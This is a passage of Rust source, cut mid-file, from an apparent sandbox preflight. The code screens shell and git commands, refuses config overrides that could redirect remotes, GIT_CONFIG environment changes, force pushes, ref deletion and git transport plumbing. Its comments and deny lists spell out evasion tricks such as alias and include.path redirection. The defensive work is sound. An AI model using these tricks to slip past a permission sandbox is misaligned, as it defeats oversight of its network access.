        if word == "-" {
            index += 1;
            continue;
        }
        if !word.starts_with('-') {
            return index;
        }
        index += if value_options.contains(&word) { 2 } else { 1 };
    }
    index
}

/// GNU `env` options that consume the following word.
const ENV_VALUE_OPTIONS: &[&str] = &[
    "-u",
    "--unset",
    "-a",
    "--argv0",
    "-C",
    "--chdir",
    "-S",
    "--split-string",
    "--env0-from",
];
/// GNU `timeout` options that consume the following word.
const TIMEOUT_VALUE_OPTIONS: &[&str] = &["-s", "--signal", "-k", "--kill-after"];
/// GNU `nice` options that consume the following word.
const NICE_VALUE_OPTIONS: &[&str] = &["-n", "--adjustment"];
/// GNU `time` options that consume the following word.
const TIME_VALUE_OPTIONS: &[&str] = &["-f", "--format", "-o", "--output"];
/// `exec -a` names the replacement argv[0].
const EXEC_VALUE_OPTIONS: &[&str] = &["-a"];

fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
    if depth > 4 {
        return Err(denied(
            "nested shell command is too deep to authorize statically",
        ));
    }
    let mut index = 0;
    while index < words.len() && is_assignment(&words[index].text) {
        refuse_config_env_assignment(&words[index])?;
        index += 1;
    }
    while index < words.len() {
        let command = basename(&words[index].text).to_string();
        if is_command_prefix_word(&command) {
            index += 1;
            continue;
        }
        match command.as_str() {
            "env" => {
                // `env -S 'cmd args'` splits its value into words, so it is a
                // shell-shaped string: scan it like one before stepping over.
                if let Some(value) = words
                    .get(index + 1)
                    .and_then(|word| word.text.strip_prefix("--split-string="))
                    .map(str::to_string)
                {
                    let body = Word {
                        text: value,
                        dynamic: words[index + 1].dynamic,
                    };
                    scan_shell_body(&body, preflight, depth)?;
                }
                index = skip_wrapper_options(words, index + 1, ENV_VALUE_OPTIONS);
                while index < words.len() && is_assignment(&words[index].text) {
                    refuse_config_env_assignment(&words[index])?;
                    index += 1;
                }
            }
            // Shell builtins that only assign or export names. `declare -x`,
            // `typeset -x`, `readonly` and `local` reach the same variables
            // the bare `NAME=value` form does.
            "export" | "readonly" | "declare" | "typeset" | "local" => {
                return authorize_declaration(&command, &words[index + 1..]);
            }
            "read" | "mapfile" | "readarray" | "unset" => {
                for operand in &words[index + 1..] {
                    refuse_git_config_variable(&operand.text)?;
                }
                return Ok(());
            }
            "printf" => return authorize_printf(&words[index + 1..]),
            "command" | "nohup" => index = skip_wrapper_options(words, index + 1, &[]),
            "exec" => index = skip_wrapper_options(words, index + 1, EXEC_VALUE_OPTIONS),
            "time" => index = skip_wrapper_options(words, index + 1, TIME_VALUE_OPTIONS),
            // `timeout [OPTION]... DURATION COMMAND [ARG]...`
            "timeout" => {
                index = skip_wrapper_options(words, index + 1, TIMEOUT_VALUE_OPTIONS);
                index += 1;
            }
            "nice" => index = skip_wrapper_options(words, index + 1, NICE_VALUE_OPTIONS),
            "sudo" => {
                index += 1;
                index = skip_sudo_options(words, index);
            }
            name if is_shell_name(name) => {
                return scan_shell_c(words, index, preflight, depth);
            }
            "git" => return inspect_git_command(&words[index..], preflight, depth),
            // Git's plumbing executables are not subcommands, so they bypass
            // `inspect_git_command` entirely when invoked by path. They take
            // the same unscreened remote destinations.
            name if is_git_plumbing_executable(name) => {
                return Err(denied(format!(
                    "{name} is not supported by manifest Git preflight"
                )));
            }
            _ => return refuse_unread_git_tail(words, index),
        }
    }
    Ok(())
}

fn authorize_declaration(command: &str, args: &[Word]) -> Result<()> {
    let nameref = matches!(command, "declare" | "typeset" | "local")
        && args
            .iter()
            .take_while(|arg| arg.text.starts_with('-') && arg.text != "--")
            .any(|arg| arg.text[1..].contains('n'));
    for arg in args.iter().filter(|word| is_assignment(&word.text)) {
        refuse_config_env_assignment(arg)?;
        if nameref && let Some((_, target)) = arg.text.split_once('=') {
            refuse_git_config_variable(target)?;
        }
    }
    Ok(())
}

fn authorize_printf(args: &[Word]) -> Result<()> {
    if let Some(option) = args.first()
        && let Some(attached) = option.text.strip_prefix("-v")
    {
        let name = if attached.is_empty() {
            args.get(1).map_or("", |word| word.text.as_str())
        } else {
            attached
        };
        refuse_git_config_variable(name)?;
    }
    Ok(())
}

fn skip_sudo_options(words: &[Word], mut index: usize) -> usize {
    while index < words.len() {
        let word = &words[index].text;
        if word == "--" {
            return index + 1;
        }
        if !word.starts_with('-') {
            return index;
        }
        let takes_value = matches!(
            word.as_str(),
            "-u" | "--user"
                | "-g"
                | "--group"
                | "-p"
                | "--prompt"
                | "-C"
                | "--close-from"
                | "-h"
                | "--host"
                | "-r"
                | "--role"
                | "-t"
                | "--type"
                | "-U"
                | "--other-user"
        );
        index += if takes_value { 2 } else { 1 };
    }
    index
}

/// Options a POSIX shell accepts before `-c` that consume the following word.
/// `-o`/`+o` name a shell option, `-O`/`+O` a `shopt` name, and the long
/// forms a startup file.
const SHELL_VALUE_OPTIONS: &[&str] = &["-o", "+o", "-O", "+O", "--rcfile", "--init-file"];
/// Short shell flags that take no value. Anything else is refused rather than
/// guessed, since an unknown flag could be the one that changes `-c`.
const SHELL_FLAGS: &[&str] = &[
    "-a", "-b", "-e", "-f", "-h", "-k", "-m", "-n", "-p", "-t", "-u", "-v", "-x", "-B", "-C", "-E",
    "-H", "-P", "-T", "-i", "-l", "-r", "-s", "-D",
];
/// Long shell flags that take no value.
const SHELL_LONG_FLAGS: &[&str] = &[
    "--posix",
    "--noprofile",
    "--norc",
    "--noediting",
    "--login",
    "--verbose",
    "--debugger",
    "--restricted",
    "--dump-strings",
    "--dump-po-strings",
    "--help",
    "--version",
];

fn scan_shell_c(
    words: &[Word],
    index: usize,
    preflight: Preflight<'_>,
    depth: usize,
) -> Result<()> {
    let mut cursor = index + 1;
    let mut has_command = false;
    while cursor < words.len() {
        let word = &words[cursor];
        let text = word.text.as_str();
        if text == "--" {
            cursor += 1;
            break;
        }
        if text == "-" || (!text.starts_with('-') && !text.starts_with('+')) {
            break;
        }
        if word.dynamic {
            return Err(denied(
                "dynamic shell option cannot be authorized for git network access",
            ));
        }
        if SHELL_VALUE_OPTIONS.contains(&text) {
            cursor += 2;
            continue;
        }
        if SHELL_LONG_FLAGS.contains(&text) {
            cursor += 1;
            continue;
        }
        if text.starts_with("--") {
            return Err(denied(
                "unsupported shell option before -c; use a supported invocation",
            ));
        }
        let flags = &text[1..];
        if flags.chars().all(|flag| {
            (flag == 'c' && text.starts_with('-'))
                || SHELL_FLAGS.iter().any(|known| known.ends_with(flag))
        }) {
            // `-ce` and `-ec` both take the script as a separate operand.
            has_command |= flags.contains('c');
            cursor += 1;
            continue;
        }
        return Err(denied(
            "unsupported shell option before -c; use a supported invocation",
        ));
    }
    if has_command && let Some(body) = words.get(cursor) {
        scan_shell_body(body, preflight, depth)?;
    }
    Ok(())
}

/// Configuration keys that could redirect a granted remote alias, log in, or
/// rewrite a granted URL, or that can turn a literal subcommand into another
/// one. A command-line override of one of these would make the alias/URL check
/// describe a different destination or operation than git actually runs.
///
/// `alias.` is here because `git -c alias.p=push p` makes the preflight see an
/// unrecognized subcommand while git runs `push`. `include.`/`includeif.` are
/// here because `git -c include.path=<file>` loads a file that can define the
/// same alias or rewrite `remote.<name>.url`.
const REDIRECTING_CONFIG_KEYS: &[&str] = &[
    "remote.",
    "url.",
    "credential.",
    "http.extraheader",
    "help.autocorrect",
    "core.editor",
    "core.fsmonitor",
    "sequence.editor",
    "alias.",
    "include.",
    "includeif.",
];

/// `-c`, `-cNAME=VALUE`, `--config NAME=VALUE`, `--config=NAME=VALUE`,
/// `--config-env NAME=ENVVAR`, and the `=` spellings. The host pins granted
/// aliases through `GIT_CONFIG_*`; an in-command override of the same key
/// would otherwise win.
fn config_overrides(words: &[Word], index: usize) -> Vec<String> {
    let word = &words[index].text;
    if word == "-c" || word == "--config" || word == "--config-env" {
        return words
            .get(index + 1)
            .map(|w| vec![w.text.clone()])
            .unwrap_or_default();
    }
    if let Some(value) = word
        .strip_prefix("--config=")
        .or_else(|| word.strip_prefix("--config-env="))
    {
        return vec![value.to_string()];
    }
    match word.strip_prefix("-c") {
        Some(value) if !word.starts_with("--") && !value.is_empty() => vec![value.to_string()],
        _ => Vec::new(),
    }
}

/// A key names a redirecting section, either bare (`alias`) or by prefix
/// (`alias.p`, `remote.origin.url`); keys are matched case-insensitively
/// because Git lowercases section and variable names.
fn is_redirecting_config_key(raw: &str) -> bool {
    let key = raw.trim().to_ascii_lowercase();
    (key.starts_with("http.") && key.ends_with(".extraheader"))
        || REDIRECTING_CONFIG_KEYS.iter().any(|prefix| {
            key.trim_end_matches('.') == prefix.trim_end_matches('.') || key.starts_with(prefix)
        })
}

fn refuse_redirecting_config(overrides: &[String]) -> Result<()> {
    for override_value in overrides {
        let key = override_value
            .split_once('=')
            .map(|(key, _)| key)
            .unwrap_or(override_value);
        if is_redirecting_config_key(key) {
            return Err(denied(
                "git configuration overrides that can redirect a granted remote or subcommand \
                 are not permitted",
            ));
        }
    }
    Ok(())
}

/// What a `git config` call does with the keys it names. `None` is the
/// classic form, where the number of operands decides between read and write.
#[derive(Clone, Copy, PartialEq, Eq)]
enum ConfigAction {
    None,
    List,
    Get,
    GetRegexp,
    GetUrlmatch,
    GetColor,
    GetColorbool,
    Write,
    Unset,
    RenameSection,
    RemoveSection,
    Edit,
}

/// One `git config` long option: its full spelling, the words it consumes
/// including itself, and what it makes the call do.
type ConfigOption = (&'static str, usize, ConfigAction);

/// Every long option `git config` accepts. `--get-color`/`--get-colorbool`
/// name a colour, not a configuration key, so their operand is not checked.
#[rustfmt::skip]
const CONFIG_OPTIONS: &[ConfigOption] = &[
    ("--global", 1, ConfigAction::None),
    ("--system", 1, ConfigAction::None),
    ("--local", 1, ConfigAction::None),
    ("--worktree", 1, ConfigAction::None),
    ("--file", 2, ConfigAction::None),
    ("--blob", 2, ConfigAction::None),
    ("--type", 2, ConfigAction::None),
    ("--default", 2, ConfigAction::None),
    ("--value", 2, ConfigAction::None),
    ("--url", 2, ConfigAction::None),
    ("--comment", 2, ConfigAction::Write),
    ("--list", 1, ConfigAction::List),
    ("--name-only", 1, ConfigAction::None),
    ("--show-origin", 1, ConfigAction::None),
    ("--show-scope", 1, ConfigAction::None),
    ("--show-names", 1, ConfigAction::None),
    ("--includes", 1, ConfigAction::None),
    ("--no-includes", 1, ConfigAction::None),
    ("--fixed-value", 1, ConfigAction::None),
    ("--null", 1, ConfigAction::None),
    ("--all", 1, ConfigAction::None),
    ("--regexp", 1, ConfigAction::None),
    ("--append", 1, ConfigAction::Write),
    ("--get", 1, ConfigAction::Get),
    ("--get-all", 1, ConfigAction::Get),
    ("--get-regexp", 1, ConfigAction::GetRegexp),
    ("--get-urlmatch", 3, ConfigAction::GetUrlmatch),
    ("--get-color", 3, ConfigAction::GetColor),
    ("--get-colorbool", 3, ConfigAction::GetColorbool),
    ("--add", 1, ConfigAction::Write),
    ("--replace-all", 1, ConfigAction::Write),
    ("--unset", 1, ConfigAction::Unset),
    ("--unset-all", 1, ConfigAction::Unset),
    ("--rename-section", 1, ConfigAction::RenameSection),
    ("--remove-section", 1, ConfigAction::RemoveSection),
    ("--edit", 1, ConfigAction::Edit),
];

/// Resolve a `--name` or `--name=value` the way git does: an exact match
/// wins, otherwise a prefix must be unambiguous. Anything else is refused
/// rather than guessed.
fn resolve_config_option(text: &str) -> Option<(&'static ConfigOption, bool)> {
    let (flag, attached) = match text.split_once('=') {
        Some((flag, value)) => (flag, !value.is_empty()),
        None => (text, false),
    };
    if let Some(exact) = CONFIG_OPTIONS.iter().find(|option| option.0 == flag) {
        return Some((exact, attached));
    }
    let mut candidates = CONFIG_OPTIONS
        .iter()
        .filter(|option| option.0.starts_with(flag));
    let first = candidates.next()?;
    if candidates.next().is_some() {
        return None;
    }
    Some((first, attached))
}

/// Classify a `git config` short-option cluster. `-lz` is `-l -z`; `-f` takes
/// the rest of the cluster or the next word as its file.
fn config_short_option(cluster: &str) -> Option<(usize, ConfigAction)> {
    let mut action = ConfigAction::None;
    let mut chars = cluster.chars();
    while let Some(flag) = chars.next() {
        match flag {
            'l' | 'z' | 'a' => {}
            'e' => action = ConfigAction::Edit,
            'f' => {
                let attached: String = chars.collect();
                return Some((if attached.is_empty() { 2 } else { 1 }, action));
            }
            _ => return None,
        }
    }
    Some((1, action))
}

impl ConfigAction {
    /// Actions that persist something. A read cannot redirect a later
    /// command, so only these check the key against the redirecting prefixes.
    fn writes(self) -> bool {
        matches!(
            self,
            ConfigAction::Write
                | ConfigAction::Unset
                | ConfigAction::RenameSection
                | ConfigAction::RemoveSection
                | ConfigAction::Edit
        )
    }
}

/// `git config` persists an alias, an include, or a remote URL that a later
/// command would use unseen by the preflight, so every key the call writes,
/// renames or edits is checked; an edit is refused outright because its
/// editor can write any key. A read is checked for a dynamic key only: it
/// cannot change what a later command does. The `set`/`get`/`unset`/
/// `rename-section`/`remove-section`/`edit` subcommands of git 2.46 and later
/// are read with the classic spellings, and long options are read with git's
/// own prefixes.
fn authorize_config(args: &[Word]) -> Result<()> {
    let mut positionals: Vec<&Word> = Vec::new();
    let mut action = ConfigAction::None;
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        let text = word.text.as_str();
        if text == "--" {
            positionals.extend(args[index + 1..].iter());
            break;
        }
        if !text.starts_with('-') || text == "-" {
            positionals.push(word);
            index += 1;
            continue;
        }
        let (consumed, is_action) = if text.starts_with("--") {
            let Some((option, attached)) = resolve_config_option(text) else {
                return Err(denied(
                    "unsupported or ambiguous option in manifest git config; use a full supported option",
                ));
            };
            (if attached { 1 } else { option.1 }, option.2)
        } else {
            let Some(classified) = config_short_option(&text[1..]) else {
                return Err(denied(
                    "unsupported option in manifest git config; use full supported options",
                ));
            };
            classified
        };
        if consumed > 1 {
            let values = args.get(index + 1..index + consumed);
            match values {
                Some(values) if values.iter().all(|value| !value.dynamic) => {}
                _ => return Err(denied("git config option requires a literal value")),
            }
        }
        if is_action == ConfigAction::GetUrlmatch {
            // `--get-urlmatch <name> <url>` names its key as the first value.
            if let Some(name) = args.get(index + 1) {
                positionals.push(name);
            }
        }
        if action == ConfigAction::None {
            action = is_action;
        }
        index += consumed;
    }
    let (action, keys) = config_subcommand(action, positionals);
    if action == ConfigAction::Edit {
        return Err(denied(
            "git config edit opens an editor that can write any key; name the keys instead",
        ));
    }
    for key in keys {
        if key.dynamic {
            return Err(denied(
                "dynamic git config key cannot be authorized; name the key literally",
            ));
        }
        if action.writes() && is_redirecting_config_key(&key.text) {
            return Err(denied(
                "git config keys that can redirect a granted remote or subcommand are not permitted",
            ));
        }
    }
    Ok(())
}

/// Fold the git 2.46 subcommand word into the classic action and return the
/// operands that name keys. The classic form has no action word, so the
/// operand count decides between a read and a write.
fn config_subcommand(action: ConfigAction, positionals: Vec<&Word>) -> (ConfigAction, Vec<&Word>) {
    let subcommand = positionals
        .first()
        .map(|word| word.text.as_str())
        .filter(|word| {
            action == ConfigAction::None || (action == ConfigAction::Write && *word == "set")
        });
    let (mut action, operands) = match subcommand {
        Some("list") => (ConfigAction::List, &positionals[1..]),
        Some("get") => (ConfigAction::Get, &positionals[1..]),
        Some("set") => (ConfigAction::Write, &positionals[1..]),
        Some("unset") => (ConfigAction::Unset, &positionals[1..]),
        Some("rename-section") => (ConfigAction::RenameSection, &positionals[1..]),
        Some("remove-section") => (ConfigAction::RemoveSection, &positionals[1..]),
        Some("edit") => (ConfigAction::Edit, &positionals[1..]),
        _ => (action, &positionals[..]),
    };
    // The classic form has no action word: `git config <name>` reads one key
    // and `git config <name> <value>` writes it.
    if action == ConfigAction::None && operands.len() >= 2 {
        action = ConfigAction::Write;
    }
    let keys = match action {
        ConfigAction::RenameSection => operands.iter().take(2).copied().collect(),
        ConfigAction::None
        | ConfigAction::Get
        | ConfigAction::GetUrlmatch
        | ConfigAction::Write
        | ConfigAction::Unset
        | ConfigAction::RemoveSection => operands.iter().take(1).copied().collect(),
        ConfigAction::List
        | ConfigAction::GetRegexp
        | ConfigAction::GetColor
        | ConfigAction::GetColorbool
        | ConfigAction::Edit => Vec::new(),
    };
    (action, keys)
}

/// The host pins the granted aliases through `GIT_CONFIG_*` entries. A shell
/// assignment to one of those names would let the command install an alias or
/// a helper that the preflight never saw, so refuse the prefix outright. The
/// name is read through the `+=` append form and the quoting a builtin allows
/// around an assignment word (`declare -x NAME=value`).
fn refuse_config_env_assignment(word: &Word) -> Result<()> {
    let mut name = word.text.as_str();
    // `declare`/`export` accept `-x` style flags among the assignments.
    if name.starts_with('-') {
        return Ok(());
    }
    let Some((raw_name, _)) = name.split_once('=') else {
        return Ok(());
    };
    name = raw_name.strip_suffix('+').unwrap_or(raw_name);
    refuse_git_config_variable(name)
}

fn refuse_git_config_variable(name: &str) -> Result<()> {
    if name.trim().starts_with("GIT_CONFIG") || matches!(name, "GIT_EDITOR" | "GIT_SEQUENCE_EDITOR")
    {
        return Err(denied(
            "shell changes to Git configuration and editor variables are not permitted",
        ));
    }
    Ok(())
}

/// Git global options that consume a separate value word. `--attr-source` is
/// newer than the image's git, but a missing entry would make the scan read
/// its value as the subcommand, so the list errs towards over-consuming.
const GIT_GLOBAL_VALUE_OPTIONS: &[&str] = &[
    "-C",
    "-c",
    "--git-dir",
    "--work-tree",
    "--namespace",
    "--exec-path",
    "--config",
    "--config-env",
    "--attr-source",
    "--super-prefix",
    "--shallow-file",
];

/// Find the git subcommand, skipping global options that take a value. A
/// `--` is not a git option, so it is refused rather than read as one.
fn git_subcommand(words: &[Word]) -> std::result::Result<Option<usize>, SandboxError> {
    let mut index = 1;
    while index < words.len() {
        let word = &words[index].text;
        if word == "--" {
            return Err(denied(
                "git does not accept -- before a subcommand; drop it",
            ));
        }
        if !word.starts_with('-') {
            return Ok(Some(index));
        }
        refuse_redirecting_config(&config_overrides(words, index))?;
        let takes_value = GIT_GLOBAL_VALUE_OPTIONS.contains(&word.as_str());
        if words[index].dynamic && takes_value {
            return Err(denied(
                "dynamic git global option value cannot be authorized",
            ));
        }
        index += if takes_value { 2 } else { 1 };
    }
    Ok(None)
}

fn inspect_git_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
    let Some(sub_index) = git_subcommand(words)? else {
        return Ok(());
    };
    let sub = &words[sub_index];
    if sub.dynamic {
        return Err(denied("dynamic git subcommand cannot be authorized"));
    }
    let args = &words[sub_index + 1..];
    match sub.text.as_str() {
        "clone" => authorize_clone(args, preflight),
        "fetch" | "pull" => authorize_fetch(args, preflight),
        // Push is authorized only on a write-granted remote. Force and
        // deletion spellings are refused here as an early refusal; the
        // host-side transport is the boundary.
        "push" => authorize_push(args, preflight),
        "ls-remote" => {
            let positional = read_positionals(
                args,
                &[
                    "-q",
                    "--quiet",
                    "--heads",
                    "--branches",
                    "--tags",
                    "--refs",
                    "--exit-code",
                    "--symref",
                ],
                &["--sort"],
            )?;
            let Some(remote) = positional.first() else {
                return if preflight.allows_local_read() {
                    Ok(())
                } else {
                    Err(denied("name an explicit granted remote for ls-remote"))
                };
            };
            preflight.read_remote(remote)
        }
        "remote" => authorize_remote_subcommand(args, preflight),
        "config" => authorize_config(args),
        "archive" => authorize_archive(args, preflight),
        "submodule" => authorize_submodule(args, preflight, depth),
        "rebase" | "bisect" => authorize_shell_bodies(args, sub.text.as_str(), preflight, depth),
        // Porcelain `push` is not the only path to a remote. The plumbing
        // verbs speak the transport protocol directly, take their own
        // destination argument, and are not authorized above, so they must
        // not inherit the catch-all.
        verb if is_remote_transport_plumbing(verb) => Err(denied(format!(
            "git {verb} is not supported by manifest Git preflight"
        ))),
        _ => Ok(()),
    }
}

/// Git's remote transport plumbing. `send-pack`/`http-push` write to the
/// remote, `fetch-pack`/`http-fetch` read arbitrary objects, and the
/// `remote-*` helpers are the transport binaries Git itself drives. All of
/// them take a remote destination that this preflight does not authorize, so
/// they cannot inherit the catch-all arm.
fn is_remote_transport_plumbing(verb: &str) -> bool {
    matches!(
        verb,
        "send-pack" | "fetch-pack" | "http-push" | "http-fetch"
    ) || verb.starts_with("remote-")
}

/// The same plumbing, invoked as a standalone executable by path (usually
/// `/usr/lib/git-core/git-send-pack`) rather than as a `git` subcommand.
fn is_git_plumbing_executable(name: &str) -> bool {
    name.strip_prefix("git-")
        .is_some_and(is_remote_transport_plumbing)
}

fn authorize_clone(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    // Only options that leave the literal clone source visible here. In
    // particular, clone's configuration options are not global Git options.
    let positional = read_positionals(
        args,
        &[
            "-q",
            "--quiet",
            "-v",
            "--verbose",
            "-n",
            "--no-checkout",
            "--bare",
            "--no-hardlinks",
            "--local",
            "--no-local",
            "--single-branch",
            "--no-single-branch",
            "--no-tags",
            "--progress",
            "--no-progress",
        ],
        &[
            "-b",
            "--branch",
            "--depth",
            "-o",
            "--origin",
            "--filter",
            "--shallow-since",
            "--shallow-exclude",
        ],
    )?;
    let Some(remote) = positional.first() else {
        return Ok(());
    };
    preflight.read_remote(remote)
}

fn authorize_fetch(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    let positional = read_positionals(
        args,
        &[
            "-q",
            "--quiet",
            "-v",
            "--verbose",
            "--ff",
            "--ff-only",
            "--no-rebase",
            "--rebase",
            "--no-tags",
            "--tags",
            "--progress",
            "--no-progress",
            "--prune",
            "--unshallow",
            "--no-recurse-submodules",
        ],
        &[
            "--depth", "--deepen", "-j", "--jobs", "--refmap", "--filter",
        ],
    )?;
    match positional.first() {
        Some(remote) => preflight.read_remote(remote),
        // Only a network-disabled call can safely leave the choice of a
        // local fetch/pull source to Git without a grant.
        None if preflight.allows_local_read() => Ok(()),
        None => Err(denied("name an explicit granted remote for fetch or pull")),
    }
}

fn authorize_remote_subcommand(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    // `git remote -v` is a listing only when no action word follows it. With
    // one, git runs the action and `-v` is just verbose.
    let mut index = 0;
    while index < args.len() {
        let word = args[index].text.as_str();
        if word == "--" {
            index += 1;
            break;
        }
        if !word.starts_with('-') || word == "-" {
            break;
        }
        if !matches!(word, "-v" | "--verbose" | "--no-verbose" | "--no-progress") {
            return Err(denied(
                "unsupported option in manifest git remote; use full supported options",
            ));
        }
        index += 1;
    }
    let Some(action) = args.get(index) else {
        return Ok(());
    };
    match action.text.as_str() {
        "add" | "set-url" => {
            // Parse the option arity, so `-t main` cannot shift the URL to
            // position 0 and leave the real destination unchecked.
            let positional = read_positionals(
                &args[index + 1..],
                &[
                    "-f",
                    "--tags",
                    "--no-tags",
                    "--push",
                    "--add",
                    "--delete",
                    "--mirror",
                    "--fetch",
                    "--no-fetch",
                ],
                &["-t", "--track", "-m", "--master", "--mirror"],
            )?;
            let Some(url) = positional.get(1) else {
                return Ok(());
            };
            preflight.read_remote(url)
        }
        "update" => Err(denied(
            "git remote update reaches every configured remote; fetch a granted remote by name",
        )),
        _ => Ok(()),
    }
}

/// Options that make a push forced in any spelling the preflight can see.
/// The transport boundary (host-side credential/relay, or the forge's branch
/// protection) is the real guard; this list keeps the common shapes from
/// reaching the network at all.
fn push_force_flags(word: &str) -> bool {
    matches!(
        word,
        "-f" | "--force" | "--force-with-lease" | "--force-if-includes" | "--mirror"
    ) || word.starts_with("--force-with-lease=")
        || word.starts_with("--force-if-includes=")
}

/// Short-option clusters that contain `f` (`-qf`, `-fq`, `-nf`). A cluster
/// whose letters are all push flags is force-bearing; anything else is left
/// to the option parser.
fn short_push_cluster_forces(word: &str) -> bool {
    let Some(letters) = word.strip_prefix('-') else {
        return false;
    };
    !word.starts_with("--")
        && !letters.is_empty()
        && letters
            .chars()
            .all(|c| matches!(c, 'f' | 'q' | 'v' | 'n' | 'u'))
        && letters.contains('f')
}

/// `--mirror` and every accepted abbreviation of it (`--mirr`, `--mir`, …).
/// No other push option starts with `--mi`, so the prefix is unambiguous.
fn push_mirror_flag(word: &str) -> bool {
    let Some(rest) = word.strip_prefix("--") else {
        return false;
    };
    !rest.is_empty() && "mirror".starts_with(rest) && rest.len() >= 3
}

/// A refspec that deletes (`:ref`, and `+:ref` — a forced deletion).
fn refspec_deletes(word: &str) -> bool {
    word.strip_prefix('+').unwrap_or(word).starts_with(':')
}

fn refspec_forces(word: &str) -> bool {
    word.starts_with('+')
}

/// `git push` against a write-granted remote, with force and deletion
/// refused. Every positional after the remote is a refspec or a remote; the
/// preflight checks that the destination is writable and that no spelling
/// forces or deletes a ref.
fn authorize_push(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    if preflight.grant.is_none() {
        return Err(no_grant_denial());
    }
    let mut positional: Vec<&Word> = Vec::new();
    let mut end_of_options = false;
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        let text = word.text.as_str();
        if word.dynamic {
            return Err(denied(
                "dynamic git push arguments cannot be authorized; name a granted remote and \
                 literal refspecs",
            ));
        }
        if !end_of_options && text == "--" {
            end_of_options = true;
            index += 1;
            continue;
        }
        if !end_of_options && text.starts_with('-') && text != "-" {
            if push_force_flags(text) || short_push_cluster_forces(text) {
                return Err(denied(
                    "force push is not permitted; a force push is refused in every spelling",
                ));
            }
            if text == "--delete" || text == "--del" || text.starts_with("--delete=") {
                return Err(push_deletion(text));
            }
            if push_mirror_flag(text) {
                return Err(denied(
                    "force push is not permitted; --mirror forces every ref",
                ));
            }
            // `--repo <dest>` names the destination itself; it must be a
            // write-granted remote, exactly like a positional.
            if text == "--repo" || text.starts_with("--repo=") {
                let value = match text.strip_prefix("--repo=") {
                    Some(value) if !value.is_empty() => Word {
                        text: value.to_string(),
                        dynamic: word.dynamic,
                    },
                    Some(_) => return Err(denied("git push --repo needs a literal value")),
                    None => match args.get(index + 1) {
                        Some(value) if !value.dynamic => value.clone(),
                        _ => return Err(denied("git push --repo needs a literal value")),
                    },
                };
                preflight.write_remote(&value)?;
                index += if text == "--repo" { 2 } else { 1 };
                continue;
            }
            // Push options that take a value; check the value is literal.
            if matches!(
                text,
                "-o" | "--push-option" | "--receive-pack" | "--exec" | "--signed"
            ) {
                match args.get(index + 1) {
                    Some(value) if !value.dynamic => {}
                    _ => return Err(denied("git push option requires a literal value")),
                }
                index += 2;
                continue;
            }
            index += 1;
            continue;
        }
        positional.push(word);
        index += 1;
    }
    let Some(remote) = positional.first() else {
        // No destination named: Git uses config (`remote.pushDefault`,
        // `branch.<name>.remote`), which the preflight cannot see. Require an
        // explicit write-granted remote.
        return Err(denied(
            "name an explicit remote for git push; a write grant requires \
             SANDBOX_GIT_WRITE_REMOTES on that remote",
        ));
    };
    preflight.write_remote(remote)?;
    for refspec in &positional[1..] {
        if refspec_deletes(&refspec.text) {
            return Err(push_deletion(&refspec.text));
        }
        if refspec_forces(&refspec.text) {
            return Err(denied(
                "force push is not permitted; a '+' refspec forces the update",
            ));
        }
    }
    Ok(())
}

/// Ref deletion is refused in every spelling the preflight can see (WI#860,
/// the maintainer's decision; there is no host switch). The per-call git
/// proxy refuses a deleting push again from its command list.
fn push_deletion(spelling: &str) -> SandboxError {
    denied(format!(
        "ref deletion ('{spelling}') is not permitted through the sandbox git grant"
    ))
}

fn authorize_archive(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
    if args
        .iter()
        .take_while(|word| word.text != "--")
        .any(|word| {
            let flag = word.text.split('=').next().unwrap_or_default();
            matches!(flag, "--e" | "--ex" | "--exe" | "--exec")
        })
    {
        return Err(denied("git archive cannot override the remote command"));
    }
    let Some(flag) = args
        .iter()
        .position(|word| word.text == "--remote" || word.text.starts_with("--remote="))
    else {
        return Ok(());
    };
    if let Some(value) = args[flag].text.strip_prefix("--remote=") {
        return preflight.read_remote(&Word {
            text: value.into(),
            dynamic: args[flag].dynamic,
        });
    }
    match args.get(flag + 1) {
        Some(remote) => preflight.read_remote(remote),
        None => Err(denied("archive --remote needs a granted remote value")),
    }
}

/// Read a command body git runs through a shell (`rebase --exec`,
/// `submodule foreach`, `bisect run`). The body is a shell script, so it is
/// tokenized and scanned like `sh -c`.
fn scan_shell_body(body: &Word, preflight: Preflight<'_>, depth: usize) -> Result<()> {
    if body.dynamic {
        return Err(denied(
            "dynamic shell body cannot be authorized for git network access",
        ));
    }
    for simple in tokenize_simple_commands(&body.text)? {
        scan_simple_command(&simple, preflight, depth + 1)?;
    }
    Ok(())
}

/// `rebase --exec <body>` and `submodule foreach <body>` run their argument
/// through a shell, which the preflight never read before. `bisect run` runs
/// the words after it directly, so the whole tail is scanned as one command.
/// A body that mentions no git is left alone, so ordinary `--exec 'cargo test'`
/// keeps working.
fn authorize_shell_bodies(
    args: &[Word],
    sub: &str,
    preflight: Preflight<'_>,
    depth: usize,
) -> Result<()> {
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        let text = word.text.as_str();
        if text == "--" {
            break;
        }
        let body = if sub == "bisect" {
            if text != "run" {
                index += 1;
                continue;
            }
            let tail = &args[index + 1..];
            if tail.is_empty() {
                return Ok(());
            }
            return scan_simple_command(tail, preflight, depth + 1);
        } else if let Some(value) = text
            .strip_prefix("-x")
            .filter(|value| !value.is_empty())
            .or_else(|| {
                let (flag, value) = text.split_once('=')?;
                matches!(flag, "--ex" | "--exe" | "--exec").then_some(value)
            })
        {
            Some(&Word {
                text: value.to_string(),
                dynamic: word.dynamic,
            })
        } else if matches!(text, "--ex" | "--exe" | "--exec" | "-x") {
            index += 1;
            args.get(index)
        } else {
            None
        };
        if let Some(body) = body {
            scan_shell_body(body, preflight, depth)?;
        }
        index += 1;
    }
    Ok(())
}

fn authorize_submodule(args: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
    let prefix = args
        .iter()
        .take_while(|word| matches!(word.text.as_str(), "-q" | "--quiet" | "--cached"))
        .count();
    let Some((action, operands)) = args[prefix..].split_first() else {
        return Ok(());
    };
    match action.text.as_str() {
        "add" => {
            let positional: Vec<&Word> = operands
                .iter()
                .filter(|word| !word.text.starts_with('-'))
                .collect();
            let Some(url) = positional.first() else {
